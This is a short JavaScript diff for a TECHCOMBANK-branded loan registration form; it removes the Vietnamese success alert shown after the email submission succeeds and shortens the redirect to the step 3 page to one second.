@@ -665,19 +665,17 @@
                     templateParams
                 );
 
-                if (response.status === 200) {
-                    userData.emailSent = true;
-                    userData.currentStep = 2;
-                    userData.timestamp = new Date().toISOString();
-                    
-                    saveToLocalStorage();
-                    
-                    alert('Đăng ký thành công! Cảm ơn bạn đã đăng ký vay với TECHCOMBANK.\nMã hồ sơ: ' + userData.loanCode);
-                    
-                    // Redirect to success page or step 3
-                    setTimeout(() => {
-                        window.location.href = 'step3.html';
-                    }, 2000);
+               if (response.status === 200) {
+    userData.emailSent = true;
+    userData.currentStep = 2;
+    userData.timestamp = new Date().toISOString();
+    
+    saveToLocalStorage();
+    
+    // Bỏ alert, chỉ redirect thẳng
+    setTimeout(() => {
+        window.location.href = 'step3.html';
+    }, 1000);  // giảm thời gian chờ xuống 1 giây cho mượt hơn
                 } else {
                     throw new Error(`Email service returned status: ${response.status}`);
                 }
